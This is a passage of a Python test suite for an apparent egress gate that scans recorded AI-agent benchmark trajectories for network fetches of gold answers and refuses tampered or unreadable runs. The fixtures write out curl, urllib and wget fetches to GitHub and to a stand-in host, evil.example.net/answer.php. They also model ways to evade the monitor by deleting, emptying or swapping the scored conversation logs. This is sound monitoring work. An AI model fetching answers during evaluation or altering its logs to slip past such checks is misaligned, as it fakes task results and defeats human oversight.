                ("glob", 'curl "{http://schemas.openxmlformats.org/a}b"')):
            decided = _still_seen(name, command)
            check(f"the same host in a real fetch position ({name}) is still "
                  "a violation",
                  decided["contaminated"]
                  and decided["violation_hosts"]
                  == ["schemas.openxmlformats.org"],
                  json.dumps(decided["violation_hosts"]))

        # ---- a fetch that ALSO parses XML is a fetch.  The exemption is over
        # spans, not over commands, so one namespace name in a command cannot
        # launder the URL beside it.
        both = _still_seen("both", (
            "python3 - <<'PY'\nimport urllib.request\nfrom lxml import etree\n"
            "x = urllib.request.urlopen('https://raw.githubusercontent.com/"
            "python-openxml/python-docx/master/features/steps/styles.py')"
            ".read()\n"
            "print(etree.fromstring(x).findall('.//{" + ns + "}style'))\nPY"))
        check("a Clark name inside a genuine network call does not clear it",
              both["contaminated"]
              and "raw.githubusercontent.com" in both["violation_hosts"],
              json.dumps(both["violation_hosts"]))

        # ...and with no client named at all: the live URL is still found, and
        # the namespace is not attributed to it.
        beside = _still_seen("beside", (
            "python3 -c \"import lxml.etree as e; "
            "print(e.parse('s.xml').findall('.//{" + ns + "}style')); "
            "print('see https://gist.example.org/gold/steps.py')\""))
        check("a live URL beside a namespace name is still the violation",
              beside["contaminated"]
              and beside["violation_hosts"] == ["gist.example.org"],
              json.dumps(beside["violation_hosts"]))

        # ---- THE POSITIONS THAT WERE DELETED, pinned as still-seen.  The
        # first cut of this fix also exempted `xmlns="uri"` and a URI inside
        # `nsmap={...}` / `namespaces={...}`; review showed the second hides a
        # REAL fetch, because `lxml.etree.parse()` dereferences an http URL
        # (libxml2 nanohttp) and lxml is not in `_DETECTORS`, so the bare-URL
        # catch-all was the only thing seeing it.  What made caught differ from
        # blinded was the NAME of a local variable.  These two checks fail the
        # moment either pattern comes back.
        gold = ("http://raw.githubusercontent.com/python-openxml/"
                "python-docx/master/features/steps/styles.py")
        lxml_fetch = _still_seen("lxmlmap", (
            "python3 -c \"from lxml import etree\n"
            "namespaces={'w':'" + ns + "','gold':'" + gold + "'}\n"
            "t=etree.parse(namespaces['gold'])\nprint(t)\""))
        check("a URL in a dict named `namespaces` is fetchable, so it is seen",
              lxml_fetch["contaminated"]
              and "raw.githubusercontent.com"
              in lxml_fetch["violation_hosts"],
              json.dumps(lxml_fetch["violation_hosts"]))
        check("...and no exemption was recorded for it either",
              not (scan_trajectory(os.path.join(root, "nslxmlmap"))
                   .get("exempt") or []),
              json.dumps(scan_trajectory(
                  os.path.join(root, "nslxmlmap")).get("exempt")))
        xmlns_cmd = _still_seen("xmlnsdecl", (
            "python3 -c \"cfg='xmlns=\\\"" + gold + "\\\"'; print(cfg)\""))
        check("a URL after an `xmlns=` token is seen: no XML dereferences it, "
              "but nothing here says it is XML",
              xmlns_cmd["contaminated"]
              and xmlns_cmd["violation_hosts"]
              == ["raw.githubusercontent.com"],
              json.dumps(xmlns_cmd["violation_hosts"]))

        # ---- the tightness of the one position that remains.
        loose = _still_seen("loose", "python3 -c \"print('{" + ns + "}')\"")
        check("a URI in braces with no name after it is NOT a qualified name",
              loose["contaminated"]
              and loose["violation_hosts"] == ["schemas.openxmlformats.org"],
              json.dumps(loose["violation_hosts"]))

        # CONTAINMENT, NOT OVERLAP.  `_exempt_position` says this is what
        # stands between the narrowing and a hole, and until review nothing
        # bound it: swapping containment for overlap passed the whole suite,
        # because `_URI_BODY` and `_URL_RE` share a tail today and the spans
        # line up exactly.  That alignment is an unstated coupling between two
        # separately-maintained patterns; this check binds the invariant
        # itself, so a future edit to either tail cannot make a URL that
        # merely TOUCHES a namespace span inherit its exemption.
        url = _URL_RE.search("fetch " + gold + " now")
        check("a URL only PARTLY inside an exempt span is not exempt (head)",
              _exempt_position(url, [(url.start(), url.end() - 5,
                                      "clark-notation")]) is None)
        check("...nor when the span starts inside it and runs past its end",
              _exempt_position(url, [(url.start() + 3, url.end() + 40,
                                      "clark-notation")]) is None)
        check("...nor when the span merely abuts it",
              _exempt_position(url, [(0, url.start(), "clark-notation")])
              is None
              and _exempt_position(url, [(url.end(), url.end() + 9,
                                          "clark-notation")]) is None)
        check("...and WHOLLY inside, boundaries included, is exempt",
              _exempt_position(url, [(url.start(), url.end(),
                                      "clark-notation")]) == "clark-notation"
              and _exempt_position(url, [(url.start() - 1, url.end() + 1,
                                          "clark-notation")])
              == "clark-notation")

        # ---- and the finding this fix is NOT allowed to touch: a real
        # `pip install` is real network, host unrecorded, SUSPECT, and it
        # fails --strict exactly as it did before.
        pipped = _still_seen("pip", "pip install lxml typing_extensions")
        check("pip install is still a suspect, exemption or no exemption",
              pipped["n_suspects"] >= 1 and not pipped["contaminated"]
              and classify(scan_trajectory(
                  os.path.join(root, "nspip")), strict)["contaminated"],
              json.dumps(pipped["hits"])[:300])

        # ---- a trajectory that is not there is not a clean trajectory.
        missing = scan_trajectory(os.path.join(root, "nope"))
        check("an absent directory says so rather than reporting clean",
              missing["present"] is False and missing["n_events"] == 0)

        # ---- scan_run: item_id -> attempt dirs, including a .r2 retry.
        items = ["coreshop/features/a.feature:1", "coreshop/features/b.feature:2",
                 "coreshop/features/c.feature:3"]
        keys = [item_key(item) for item in items]
        check("the attempt key is sha1(item_id)[:16], as the adapter names it",
              keys[0] == hashlib.sha1(items[0].encode()).hexdigest()[:16]
              and len(keys[0]) == 16)
        # item 0: clean first attempt, contaminated RETRY.
        _terminal(os.path.join(root, keys[0], "c"), 1, "ls src", "src")
        _terminal(os.path.join(root, keys[0] + ".r2", "c"), 1,
                  "python3 -c \"import urllib.request; "
                  "urllib.request.urlopen('https://raw.githubusercontent.com/"
                  "coreshop/CoreShop/2026.x/src/X.php')\"",
                  "<?php class X {}")
        # item 1: clean, and it talks to the model endpoint.
        _terminal(os.path.join(root, keys[1], "c"), 1,
                  f"curl -s https://{endpoint}/v1/models", "{}")
        # item 2: no trajectory at all.

        # The rows below name a system so `scan_run` resolves a native
        # contract for it; which system is not what they are about.  Without
        # the agent component there is no arm to name and naming one is
        # refused, so they run on a fixture and the refusal itself is the
        # leg that runs instead.
        try:
            from .agents.registry import REGISTRY          # noqa: F401
        except ImportError:
            row_adapter = "gold"
            refusal = ""
            try:
                _native_contract("oh")
            except SystemExit as exc:
                refusal = str(exc)
            check("an agent arm this checkout does not ship is refused by "
                  "name, and a fixture owes no contract",
                  "'oh'" in refusal and "agent component" in refusal
                  and _native_contract(row_adapter) is None, refusal)
        else:
            row_adapter = "oh"

        run_path = os.path.join(tmp, "run.jsonl")
        with open(run_path, "w", encoding="utf-8") as handle:
            for item in items:
                handle.write(json.dumps(
                    {"item_id": item, "condition": "c1.5",
                     "adapter": row_adapter,
                     "metadata": {"trajectory": {"dir": os.path.join(
                         root, item_key(item))}}}) + "\n")
        verdicts = scan_run(run_path, root, policy)
        check("every row in the run file gets a verdict",
              sorted(verdicts) == sorted(items), json.dumps(sorted(verdicts)))
        check("a row's attempts include its .rN retries",
              len(verdicts[items[0]]["attempts"]) == 2
              and any(attempt["dir"].endswith(".r2")
                      for attempt in verdicts[items[0]]["attempts"]),
              json.dumps([a["dir"] for a in verdicts[items[0]]["attempts"]]))
        check("a violation in ANY attempt contaminates the row",
              verdicts[items[0]]["contaminated"]
              and verdicts[items[0]]["violation_hosts"]
              == ["raw.githubusercontent.com"])
        check("a row that only reached the model endpoint is clean",
              not verdicts[items[1]]["contaminated"]
              and verdicts[items[1]]["n_permitted"] >= 1)
        check("a row with no trajectory is flagged, not cleared",
              verdicts[items[2]]["no_trajectory"]
              and not verdicts[items[2]]["attempts"])

        # The condition trap: the SAME key exists under c2, and a c2 run file
        # scanned against the shared root must not inherit c1.5's finding.
        shared_root = os.path.join(tmp, "trajectories")
        _terminal(os.path.join(shared_root, "c2", keys[0], "c"), 1,
                  "ls src", "src")
        c2_run = os.path.join(tmp, "run_c2.jsonl")
        with open(c2_run, "w", encoding="utf-8") as handle:
            handle.write(json.dumps({"item_id": items[0],
                                     "condition": "c2"}) + "\n")
        c2_verdicts = scan_run(c2_run, shared_root, policy)
        check("a c2 row does NOT inherit the c1.5 attempt with the same key",
              not c2_verdicts[items[0]]["contaminated"]
              and all("/c2/" in attempt["dir"]
                      for attempt in c2_verdicts[items[0]]["attempts"]),
              json.dumps([a["dir"]
                          for a in c2_verdicts[items[0]]["attempts"]]))

        # ---- the gate: refusal, exit codes, and the quarantine split.
        import io
        buf = io.StringIO()
        rc = gate(run_path, root, policy, out=buf)
        text = buf.getvalue()
        check("the gate REFUSES a run file with a contaminated row", rc == 1)
        check("...naming the item, the host and the offending command",
              items[0] in text and "raw.githubusercontent.com" in text
              and "urlopen" in text, text[-600:])
        check("...and saying which rows it could not assess",
              "NOT ASSESSED" in text and items[2] in text)
        check("...and that detection is not prevention, every time",
              "not prevention" in text.lower()
              and "egress_allowlist" in text)

        out_path = os.path.join(tmp, "clean.jsonl")
        buf = io.StringIO()
        rc = gate(run_path, root, policy, quarantine_out=out_path, out=buf)
        kept = [json.loads(line) for line in open(out_path) if line.strip()]
        side = [json.loads(line) for line in
                open(out_path + ".quarantined.jsonl") if line.strip()]
        check("--quarantine removes exactly the contaminated rows", rc == 1
              and [row["item_id"] for row in kept] == [items[1], items[2]],
              json.dumps([row["item_id"] for row in kept]))
        check("...and keeps them, with the evidence, in the sidecar",
              len(side) == 1 and side[0]["row"]["item_id"] == items[0]
              and side[0]["egress"]["violation_hosts"]
              == ["raw.githubusercontent.com"]
              and any(hit["snippet"] for attempt in side[0]["egress"]["attempts"]
                      for hit in attempt["hits"]),
              json.dumps(side)[:300])
        check("...leaving the input run file byte-identical",
              len(_rows(run_path)) == 3)
        check("the gate refuses to overwrite the run file it is reading",
              gate(run_path, root, policy, quarantine_out=run_path,
                   out=io.StringIO()) == 2)
        check("...and refuses to clobber a previous quarantine",
              gate(run_path, root, policy, quarantine_out=out_path,
                   out=io.StringIO()) == 2)

        empty_run = os.path.join(tmp, "empty.jsonl")
        with open(empty_run, "w", encoding="utf-8") as handle:
            handle.write(json.dumps({"item_id": items[2],
                                     "condition": "c1.5"}) + "\n")
        check("a run whose rows have NO trajectory is refused, not passed",
              gate(empty_run, root, policy, out=io.StringIO()) == 3)
        check("a missing run file is an error, not a pass",
              gate(os.path.join(tmp, "nofile.jsonl"), root, policy,
                   out=io.StringIO()) == 2)

        clean_run = os.path.join(tmp, "clean_run.jsonl")
        with open(clean_run, "w", encoding="utf-8") as handle:
            handle.write(json.dumps({"item_id": items[1],
                                     "condition": "c1.5"}) + "\n")
        buf = io.StringIO()
        check("a clean run file passes", gate(clean_run, root, policy,
                                              out=buf) == 0)
        check("...and even the pass says detection is not prevention",
              "not prevention" in buf.getvalue().lower())

        check("policy_from_base_url takes the endpoint off the llm config",
              policy_from_base_url("https://api.deepseek.com").allow
              == frozenset({"api.deepseek.com"}))
        check("...and allowlists nothing when there is no base_url",
              policy_from_base_url(None).allow == frozenset())

        # ================================================ gate v2: fail-closed
        #
        # Both holes below were REPRODUCED against this module at v1 before the
        # fix: each of these fixtures exited 0 under the old gate.
        check("the gate stamps the rules that produced its verdict",
              EGRESS_GATE_VERSION == 5)

        # ---- hole 1: an attempt directory in a format this module cannot
        # read.  v1 saw a directory, cleared `no_trajectory`, and passed the
        # run CLEAN while a violating fetch sat in plain text one level down.
        foreign_item = "coreshop/features/foreign.feature:7"
        foreign = os.path.join(root, item_key(foreign_item))
        os.makedirs(foreign, exist_ok=True)
        with open(os.path.join(foreign, "trajectory.jsonl"), "w",
                  encoding="utf-8") as handle:
            handle.write(json.dumps({"step": 1, "tool": "bash", "cmd":
                                     "curl -sL https://raw.githubusercontent."
                                     "com/coreshop/CoreShop/2026.x/src/X.php "
                                     "-o /tmp/X.php"}) + "\n")
        foreign_report = scan_trajectory(foreign)
        check("a foreign-format attempt dir is NOT reported as parsed",
              foreign_report["parsed"] is False
              and foreign_report["n_events"] == 0
              and foreign_report["present"] is True,
              json.dumps({k: foreign_report[k]
                          for k in ("parsed", "n_events", "present")}))
        check("...and every file it could not read is inventoried",
              foreign_report["unrecognized"] == ["trajectory.jsonl"],
              json.dumps(foreign_report["unrecognized"]))
        foreign_decided = classify(foreign_report, policy)
        check("the raw sweep finds the fetch the structural pass cannot see",
              any(hit["kind"] == "raw"
                  and hit["host"] == "raw.githubusercontent.com"
                  for hit in foreign_decided["hits"]),
              json.dumps(foreign_decided["hits"])[:400])
        check("...as a SUSPECT, never as a VIOLATION -- bytes do not say the "
              "command ran",
              foreign_decided["n_suspects"] >= 1
              and foreign_decided["n_violations"] == 0,
              json.dumps(foreign_decided["verdicts"]))
        foreign_run = os.path.join(tmp, "foreign.jsonl")
        with open(foreign_run, "w", encoding="utf-8") as handle:
            handle.write(json.dumps({"item_id": foreign_item,
                                     "condition": "c1.5"}) + "\n")
        buf = io.StringIO()
        rc = gate(foreign_run, root, policy, out=buf)
        check("the gate REFUSES (4) a run whose trajectory it cannot read",
              rc == 4, buf.getvalue()[-500:])
        check("...saying why, and quoting what the raw sweep found",
              "UNASSESSABLE" in buf.getvalue()
              and "trajectory.jsonl" in buf.getvalue()
              and "raw.githubusercontent.com" in buf.getvalue(),
              buf.getvalue()[-800:])

        # ---- a raw hit is evidence the scan was incomplete, not evidence of
        # retrieval, so it may not accuse the row -- not even under --strict,
        # and not even when its host is one the policy denies.
        strict = Policy(allow=frozenset({endpoint}), strict_suspect=True)
        buf = io.StringIO()
        rc = gate(foreign_run, root, strict, out=buf)
        check("a raw hit on a DENIED host is refused as unassessable under "
              "--strict, not as a violation the bytes cannot prove",
              rc == 4 and "CONTAMINATED" not in buf.getvalue(),
              buf.getvalue()[-500:])
        # The false accusation that motivated this: an llm_config.json the
        # gate does not parse, naming the ALLOWED model endpoint.  Under v2
        # `--strict` reported it as "the agent retrieved from the network".
        cfg_item = "coreshop/features/config.feature:9"
        cfg_dir = os.path.join(root, item_key(cfg_item))
        _terminal(os.path.join(cfg_dir, "c"), 1, "ls src", "src")
        with open(os.path.join(cfg_dir, "llm_config.json"), "w",
                  encoding="utf-8") as handle:
            json.dump({"base_url": f"https://{endpoint}/v1",
                       "model": "deepseek-v4"}, handle)
        cfg_run = os.path.join(tmp, "config.jsonl")
        with open(cfg_run, "w", encoding="utf-8") as handle:
            handle.write(json.dumps({"item_id": cfg_item,
                                     "condition": "c1.5"}) + "\n")
        cfg_entry = scan_run(cfg_run, root, strict)[cfg_item]
        check("a raw hit on an ALLOWED host never contaminates the row",
              not cfg_entry["contaminated"]
              and cfg_entry["n_raw_suspects"] >= 1
              and cfg_entry["unassessable"],
              json.dumps({k: cfg_entry[k] for k in
                          ("contaminated", "n_suspects", "n_raw_suspects")}))
        buf = io.StringIO()
        rc = gate(cfg_run, root, strict, out=buf)
        check("...the gate refuses it (4) as unreadable, and accuses nobody",
              rc == 4 and "CONTAMINATED" not in buf.getvalue()
              and "retrieved from the network" not in buf.getvalue()
              and "made a network call" not in buf.getvalue(),
              buf.getvalue()[-700:])
        check("...while still showing the snippet the sweep found, and saying "
              "what a raw hit is",
              "raw sweep" in buf.getvalue() and endpoint in buf.getvalue()
              and "scan was incomplete" in buf.getvalue(),
              buf.getvalue()[-700:])

        # ---- hole 2: one row with events, one without.  v1 printed NOT
        # ASSESSED for the second and exited 0 anyway.
        mixed_run = os.path.join(tmp, "mixed.jsonl")
        with open(mixed_run, "w", encoding="utf-8") as handle:
            for item in (items[1], items[2]):
                handle.write(json.dumps({"item_id": item,
                                         "condition": "c1.5"}) + "\n")
        buf = io.StringIO()
        check("a run file with one unassessed row does not exit 0",
              gate(mixed_run, root, policy, out=buf) == 4,
              buf.getvalue()[-400:])
        buf = io.StringIO()
        rc = gate(mixed_run, root, policy, out=buf, allow_unassessed=True)
        check("--allow-unassessed restores the old behaviour, deliberately",
              rc == 0 and "NOT ASSESSED" in buf.getvalue()
              and "allow-unassessed" in buf.getvalue(),
              buf.getvalue()[-500:])

        # ---- conservation: the run row's own counter against the disk.
        cons_item = "coreshop/features/conserved.feature:1"
        cons_dir = os.path.join(root, item_key(cons_item))
        _terminal(os.path.join(cons_dir, "c"), 1, "ls src", "src")   # 2 events

        def _cons(recorded_n, conversations=("c",), name=None):
            path = os.path.join(tmp, name or f"cons_{recorded_n}.jsonl")
            trajectory = {"dir": cons_dir, "present": True,
                          "n_events": recorded_n}
            if conversations is not None:
                trajectory["conversations"] = list(conversations)
            with open(path, "w", encoding="utf-8") as handle:
                handle.write(json.dumps(
                    {"item_id": cons_item, "condition": "c1.5",
                     "metadata": {"trajectory": trajectory}}) + "\n")
            return path

        agreed = scan_run(_cons(2), root, policy)[cons_item]
        check("three agreeing counters make a row assessable",
              not agreed["unassessable"] and agreed["n_events"] == 2,
              json.dumps(agreed["unassessable_reasons"]))
        shrunk = scan_run(_cons(132), root, policy)[cons_item]
        check("a row scored on 132 events with 2 on disk is unassessable",
              shrunk["unassessable"]
              and any("scored evidence is gone" in reason
                      for reason in shrunk["unassessable_reasons"]),
              json.dumps(shrunk["unassessable_reasons"]))
        grown = scan_run(_cons(1), root, policy)[cons_item]
        check("...but a SUPERSET on disk is reported, not refused",
              not grown["unassessable"] and grown["superset"]
              and grown["superset"][0]["on_disk"] == 2,
              json.dumps(grown["superset"]))
        # ...and the SAME surplus, on a row that names no conversations, is
        # refused: without an inventory there is nothing to show the surplus
        # contains what was scored.  Under v3 this row read exactly as v2 did.
        blind = scan_run(_cons(1, conversations=None, name="cons_blind.jsonl"),
                         root, policy)[cons_item]
        check("a surplus on a row that does not name its conversations is NOT "
              "read as a superset -- there is no inventory to check",
              blind["unassessable"] and not blind["superset"]
              and any("does not name which conversations" in reason
                      for reason in blind["unassessable_reasons"]),
              json.dumps(blind["unassessable_reasons"]))
        blind_empty = scan_run(
            _cons(1, conversations=(), name="cons_blind_empty.jsonl"),
            root, policy)[cons_item]
        check("...and an EMPTY conversations list is the same absence of "
              "inventory, not a claim that there were none",
              blind_empty["unassessable"] and not blind_empty["superset"],
              json.dumps(blind_empty["unassessable_reasons"]))
        moved = os.path.join(tmp, "cons_moved.jsonl")
        with open(moved, "w", encoding="utf-8") as handle:
            handle.write(json.dumps(
                {"item_id": cons_item, "condition": "c1.5",
                 "metadata": {"trajectory": {
                     "dir": cons_dir + ".r9", "present": True,
                     "n_events": 40}}}) + "\n")
        gone = scan_run(moved, root, policy)[cons_item]
        check("a row scored against a directory that is no longer there is "
              "unassessable, even though another attempt reads clean",
              gone["unassessable"]
              and any("never read that directory" in reason
                      for reason in gone["unassessable_reasons"]),
              json.dumps(gone["unassessable_reasons"]))

        # ---- conservation is about IDENTITY, not only size.  Reproduced
        # against v2: the block below exited CLEAN (0), with the destroyed
        # conversation printed as a NOTE saying the directory had grown.
        swap_item = "coreshop/features/swapped.feature:6"
        swap_dir = os.path.join(root, item_key(swap_item))
        _terminal(os.path.join(swap_dir, "convA"), 1,
                  "curl -sL https://raw.githubusercontent.com/coreshop/"
                  "CoreShop/2026.x/src/X.php -o /tmp/X.php",
                  "<?php class X {}")            # 2 events, one violation

        def _swap(name, conversations):
            path = os.path.join(tmp, name)
            with open(path, "w", encoding="utf-8") as handle:
                handle.write(json.dumps(
                    {"item_id": swap_item, "condition": "c1.5",
                     "metadata": {"trajectory": {
                         "dir": swap_dir, "present": True, "n_events": 2,
                         "conversations": conversations}}}) + "\n")
            return path

        scored = _swap("swap_scored.jsonl", ["convA"])
        buf = io.StringIO()
        check("the violating conversation is REFUSED while it is on disk",
              gate(scored, root, policy, out=buf) == 1, buf.getvalue()[-400:])
        shutil.rmtree(os.path.join(swap_dir, "convA"))
        for index in range(1, 6):                # 5 innocuous events instead
            _event(os.path.join(swap_dir, "convB"), index,
                   {"id": f"m{index}", "kind": "MessageEvent",
                    "source": "agent"})
        swapped = scan_run(scored, root, policy)[swap_item]
        check("destroying the scored conversation and dropping a LARGER one "
              "in its place is a mismatch, not a superset",
              swapped["unassessable"] and not swapped["superset"]
              and any("convA" in reason
                      for reason in swapped["unassessable_reasons"]),
              json.dumps(swapped["unassessable_reasons"]))
        buf = io.StringIO()
        check("...so the gate refuses (4) where v2 exited CLEAN",
              gate(scored, root, policy, out=buf) == 4
              and "CLEAN (0)" not in buf.getvalue()
              and "NOTE:" not in buf.getvalue(), buf.getvalue()[-600:])
        kept = scan_run(_swap("swap_kept.jsonl", ["convB"]), root,
                        policy)[swap_item]
        check("...while a surplus whose recorded conversations are ALL still "
              "on disk is still read as a superset, as c3's 100 rows are",
              not kept["unassessable"] and kept["superset"]
              and kept["superset"][0]["on_disk"] == 5,
              json.dumps(kept["unassessable_reasons"] or kept["superset"]))

        # ---- the same attack, one token cheaper: EMPTY the recorded
        # conversation instead of deleting it.  v3 asked `isdir` on the
        # conversation NAME, so the surviving empty directory answered yes and
        # the gate printed "has grown" and exited CLEAN (0) with the scored
        # curl gone.  v4 asks how many events are still under it.
        empt_item = "coreshop/features/emptied.feature:11"
        empt_dir = os.path.join(root, item_key(empt_item))
        _terminal(os.path.join(empt_dir, "convA"), 1,
                  "curl -sL https://raw.githubusercontent.com/coreshop/"
                  "CoreShop/2026.x/src/Y.php -o /tmp/Y.php",
                  "<?php class Y {}")              # 2 events, one violation
        empt_run = os.path.join(tmp, "emptied.jsonl")
        with open(empt_run, "w", encoding="utf-8") as handle:
            handle.write(json.dumps(
                {"item_id": empt_item, "condition": "c1.5",
                 "metadata": {"trajectory": {
                     "dir": empt_dir, "present": True, "n_events": 2,
                     "conversations": ["convA"]}}}) + "\n")
        buf = io.StringIO()
        check("the violating conversation is REFUSED while its events are "
              "on disk", gate(empt_run, root, policy, out=buf) == 1,
              buf.getvalue()[-400:])
        for name in os.listdir(os.path.join(empt_dir, "convA", "events")):
            os.remove(os.path.join(empt_dir, "convA", "events", name))
        check("...and convA is still a directory, which is exactly what v3 "
              "was asking about",
              os.path.isdir(os.path.join(empt_dir, "convA")))
        for index in range(1, 6):                # 5 innocuous events instead
            _event(os.path.join(empt_dir, "convB"), index,
                   {"id": f"m{index}", "kind": "MessageEvent",
                    "source": "agent"})
        emptied = scan_run(empt_run, root, policy)[empt_item]
        check("emptying the recorded conversation IN PLACE is a mismatch too "
              "-- the inventory is made of events, not of directory names",
              emptied["unassessable"] and not emptied["superset"]
              and any("convA" in reason
                      for reason in emptied["unassessable_reasons"]),
              json.dumps(emptied["unassessable_reasons"]))
        buf = io.StringIO()
        check("...so the gate refuses (4), naming convA, where v3 exited "
              "CLEAN with a 'has grown' NOTE",
              gate(empt_run, root, policy, out=buf) == 4
              and "convA" in buf.getvalue()
              and "CLEAN (0)" not in buf.getvalue()
              and "has grown" not in buf.getvalue(), buf.getvalue()[-700:])
        # The conversation NAME is data off the run row, and it is joined onto
        # a path.  A name that walks out of the attempt must resolve to no
        # events -- otherwise a row could point the inventory check at
        # somebody else's directory and have their events answer for its own.
        check("a recorded conversation name that is not a plain directory "
              "under the attempt counts zero events, never someone else's",
              _conversation_events(empt_dir, "..") == 0
              and _conversation_events(empt_dir, os.path.join("..",
                                                              "aaaaaaaaaaaaaaa1"
                                                              )) == 0
              and _conversation_events(empt_dir, "convB") == 5,
              str([_conversation_events(empt_dir, ".."),
                   _conversation_events(empt_dir, "convB")]))

        # ---- the mirror image: the row's own metadata says there was no
        # trajectory, and a conventionally named directory full of events
        # turns up for it anyway.
        ghost_item = "coreshop/features/ghost.feature:8"
        ghost_dir = os.path.join(root, item_key(ghost_item))
        _terminal(os.path.join(ghost_dir, "c"), 1, "ls src", "src")

        def _ghost(name, trajectory):
            path = os.path.join(tmp, name)
            row = {"item_id": ghost_item, "condition": "c1.5"}
            if trajectory is not None:
                row["metadata"] = {"trajectory": trajectory}
            with open(path, "w", encoding="utf-8") as handle:
                handle.write(json.dumps(row) + "\n")
            return path

        absent = scan_run(_ghost("ghost_absent.jsonl", {"present": False}),
                          root, policy)[ghost_item]
        check("a row that recorded present=false and HAS a directory full of "
              "events is a mismatch, not a clean row",
              absent["unassessable"]
              and any("never wrote a trajectory" in reason
                      for reason in absent["unassessable_reasons"]),
              json.dumps(absent["unassessable_reasons"]))
        buf = io.StringIO()
        check("...and the gate refuses it (4)",
              gate(_ghost("ghost_absent2.jsonl", {"present": False}), root,
                   policy, out=buf) == 4, buf.getvalue()[-400:])
        zero = scan_run(_ghost("ghost_zero.jsonl",
                               {"dir": ghost_dir, "present": True,
                                "n_events": 0}), root, policy)[ghost_item]
        check("...n_events: 0 is the same claim and is treated the same way",
              zero["unassessable"]
              and any("never wrote a trajectory" in reason
                      for reason in zero["unassessable_reasons"]),
              json.dumps(zero["unassessable_reasons"]))
        check("but a row with NO metadata claims nothing, and is still read "
              "by convention -- the archived c1.5 rows depend on it",
              gate(_ghost("ghost_bare.jsonl", None), root, policy,
                   out=io.StringIO()) == 0)
        # ...and the mismatch is per-ITEM while `present: false` is per-ROW.
        # A crashed first attempt followed by a retry that DID record its
        # trajectory is the ordinary case (52 of 100 archived c1.5 items and
        # 47 of 100 c2 items have more than one row); refusing the item for it
        # would be the gate accusing a run of losing evidence it still has.
        retry_run = os.path.join(tmp, "ghost_retry.jsonl")
        with open(retry_run, "w", encoding="utf-8") as handle:
            for trajectory in ({"present": False},
                               {"dir": ghost_dir, "present": True,
                                "n_events": 2, "conversations": ["c"]}):
                handle.write(json.dumps(
                    {"item_id": ghost_item, "condition": "c1.5",
                     "metadata": {"trajectory": trajectory}}) + "\n")
        retried = scan_run(retry_run, root, policy)[ghost_item]
        buf = io.StringIO()
        check("a crashed row (present=false) plus a retry row that DID record "
              "the trajectory leaves the item assessed, not refused",
              not retried["unassessable"] and retried["rows"] == 2
              and gate(retry_run, root, policy, out=buf) == 0,
              json.dumps(retried["unassessable_reasons"])
              + buf.getvalue()[-300:])

        # ---- an event file that will not parse.
        broken_item = "coreshop/features/broken.feature:2"
        broken = os.path.join(root, item_key(broken_item), "c")
        _terminal(broken, 1, "ls src", "src")
        with open(os.path.join(broken, "events",
                               "event-00009-truncated.json"), "w",
                  encoding="utf-8") as handle:
            handle.write('{"action": {"command": "wget https://evil.example'
                         '.net/answer.php"')      # truncated: no closing brace
        broken_report = scan_trajectory(broken)
        check("a truncated event is an error, not a silently skipped file",
              broken_report["errors"] and broken_report["parsed"] is False
              and broken_report["n_events"] == 3
              and broken_report["n_parsed"] == 2,
              json.dumps({k: broken_report[k]
                          for k in ("n_events", "n_parsed", "parsed")}))
        check("...and its bytes are swept anyway",
              any(hit["kind"] == "raw" and hit["host"] == "evil.example.net"
                  for hit in broken_report["hits"]),
              json.dumps(broken_report["hits"])[:400])
        broken_run = os.path.join(tmp, "broken.jsonl")
        with open(broken_run, "w", encoding="utf-8") as handle:
            handle.write(json.dumps({"item_id": broken_item,
                                     "condition": "c1.5"}) + "\n")
        buf = io.StringIO()
        check("a row with an unreadable event is refused, not cleared",
              gate(broken_run, root, policy, out=buf) == 4,
              buf.getvalue()[-400:])
        broken_entry = scan_run(broken_run, root, policy)[broken_item]
        check("...and the unreadable files are carried onto the row",
              len(broken_entry["unreadable"]) >= 1
              and broken_entry["n_events"] == 3,
              json.dumps(broken_entry["unreadable"])[:300])

        # ---- the sidecars the SDK really writes are recognised, not flagged.
        # Without this the whole archive would be unassessable: 34 C1.5, 98 C2
        # and 99 C3 attempts carry a TASKS.json, and every one carries a
        # base_state.json whose SDK config holds https://docs.all-hands.dev/.
        sidecar_item = "coreshop/features/sidecar.feature:3"
        sidecar = os.path.join(root, item_key(sidecar_item), "c")
        _terminal(sidecar, 1, "ls src", "src")
        with open(os.path.join(sidecar, "base_state.json"), "w",
                  encoding="utf-8") as handle:
            json.dump({"agent": {"llm": {"openrouter_site_url":
                                         "https://docs.all-hands.dev/"}}},
                      handle)
        with open(os.path.join(sidecar, "TASKS.json"), "w",
                  encoding="utf-8") as handle:
            json.dump([{"title": "explore the repo", "status": "todo"}],
                      handle)
        sidecar_report = scan_trajectory(sidecar)
        check("base_state.json and TASKS.json are recognised, not swept",
              sidecar_report["unrecognized"] == []
              and sidecar_report["parsed"] is True
              and sidecar_report["n_hits"] == 0,
              json.dumps(sidecar_report["unrecognized"])
              + json.dumps(sidecar_report["hits"])[:200])
        sidecar_run = os.path.join(tmp, "sidecar.jsonl")
        with open(sidecar_run, "w", encoding="utf-8") as handle:
            handle.write(json.dumps({"item_id": sidecar_item,
                                     "condition": "c1.5"}) + "\n")
        buf = io.StringIO()
        check("a real-shaped attempt directory still passes clean",
              gate(sidecar_run, root, policy, out=buf) == 0,
              buf.getvalue()[-400:])
        check("...and the header reports the assessed/unassessable split",
              "1 assessed, 0 unassessable" in buf.getvalue()
              and f"gate version : {EGRESS_GATE_VERSION}" in buf.getvalue(),
              buf.getvalue()[:600])

        # ---- the two on-disk counters have to agree with each other, and the
        # recount has to answer the same number wherever it is pointed.
        check("the recount answers the same at attempt, conversation and "
              "events level",
              _recount_events(os.path.join(root, item_key(sidecar_item)))
              == _recount_events(sidecar)
              == _recount_events(os.path.join(sidecar, "events")) == 2,
              str([_recount_events(os.path.join(root, item_key(sidecar_item))),
                   _recount_events(sidecar),
                   _recount_events(os.path.join(sidecar, "events"))]))
        stray_item = "coreshop/features/stray.feature:5"
        stray = os.path.join(root, item_key(stray_item), "c")
        _terminal(stray, 1, "ls src", "src")
        with open(os.path.join(stray, "events", "session.json"), "w",
                  encoding="utf-8") as handle:
            json.dump({"note": "a record under a name the scanner skips"},
                      handle)
        stray_report = scan_trajectory(os.path.join(root,
                                                    item_key(stray_item)))
        check("a file sitting in events/ under a name we do not scan is "
              "caught by the recount",
              stray_report["recount"] == 3 and stray_report["n_events"] == 2,
              json.dumps({k: stray_report[k]
                          for k in ("recount", "n_events")}))
        stray_run = os.path.join(tmp, "stray.jsonl")
        with open(stray_run, "w", encoding="utf-8") as handle:
            handle.write(json.dumps({"item_id": stray_item,
                                     "condition": "c1.5"}) + "\n")
